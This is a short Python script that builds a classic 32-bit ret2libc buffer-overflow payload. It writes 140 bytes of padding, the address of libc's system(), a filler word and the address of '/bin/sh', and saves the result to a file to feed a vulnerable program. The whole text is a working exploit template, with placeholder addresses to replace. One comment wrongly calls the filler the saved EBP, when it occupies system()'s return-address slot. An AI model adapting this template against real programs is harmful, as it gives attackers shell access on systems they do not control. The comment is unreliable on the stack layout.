import struct

# Assume these values are found through your analysis
offset = 140
libc_base_address = 0xb7e2c000
system_offset = 0x0003f060  # Example address, replace with the actual one
bin_sh_offset = 0x160c58

# Create the payload
payload = b"A" * offset
payload += struct.pack("<I", libc_base_address + system_offset)
payload += b"JUNK"  # This would be the saved EBP; it can be any placeholder
payload += struct.pack("<I", libc_base_address + bin_sh_offset)

# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)